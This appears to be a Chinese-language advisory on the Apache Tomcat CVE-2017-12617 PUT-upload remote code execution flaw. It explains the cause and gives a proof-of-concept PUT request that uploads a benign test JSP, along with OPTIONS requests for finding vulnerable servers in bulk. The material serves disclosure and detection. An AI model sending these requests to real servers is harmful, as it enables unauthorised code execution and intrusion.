# Apache Tomcat 任意代码执行漏洞（CVE-2017-12617）
# 漏洞描述

Apache Tomcat团队10月3日宣布，如果配置了默认servlet，则在9.0.1（Beta），8.5.23,8.0.47和7.0.82之前的所有Tomcat版本都包含所有操作系统上的潜在危险的远程执行代码（RCE）漏洞，CVE-2017-12617：远程代码执行漏洞。

只需参数readonly设置为false或者使用参数readonly设置启用WebDAV servlet false。此配置将允许任何未经身份验证的用户上传文件（如WebDAV中所使用的）。发现并阻止上传JavaServer Pages（.jsp）的过滤器可以避免这个问题。所以只要JSP可以上传，然后就可以在服务器上执行。

当开发人员修改配置Tomcat文件/apache-tomcat-8.5.20/conf/web.xml，将默认 servlet 的只读初始化参数设置为 false后，就开启了WebDAV servlet支持HTTP PUT 方法。攻击者可以利用此漏洞通过特制的请求将 JSP 文件上传到服务器。 然后可以请求这个 JSP，并且它包含的任何代码都将由服务器执行。

漏洞涉及到 DefaultServlet和 JspServlet，DefaultServlet的作用是处理静态文件 ，JspServlet 的作用是处理jsp 与jspx 文件的请求，同时DefaultServlet 可以处理 PUT 或 DELETE请求，这个漏洞的原因是通过构造特殊后缀名，绕过了tomcat检测，让它用DefaultServlet的逻辑去处理请求，从而PUT上传了jsp文件。

原理分析参考：https://mp.weixin.qq.com/s/wWkb079hUYOwDgVQqEqGZQ

## POC参考：

```
PUT /test.jsp/ HTTP/1.1
Host: 127.0.0.1:8888
Content-Length: 26


<%out.println("test");%>
```
访问http://127.0.0.1:8080/test.jsp 页面会出现test这个字符串


## 如何快速识别

- Tomcat CVE-2017-12617 任意代码执行漏洞批量识别？
+ 1、根据Tomcat版本判断可以确定是否受漏洞影响
+ 2、使用OPTIONS判断是否启用PUT

通过2次OPTIONS请求，第一次请求/ 根据报错信息得到tomcat版本，第二次判断是否支持PUT。两个条件满足，漏洞条件即可认为存在漏洞。

```
OPTIONS / HTTP/1.1
Host: 127.0.0.1:8888
Content-Length: 0


OPTIONS /xx任意地址 HTTP/1.1
Host: 127.0.0.1:8888
Content-Length: 0

返回：支持PUT 即可判定存在漏洞
HTTP/1.1 200 
Allow: GET, HEAD, POST, PUT, DELETE, OPTIONS
Content-Length: 0
Date: Tue, 27 Jul 2021 12:27:25 GMT
```

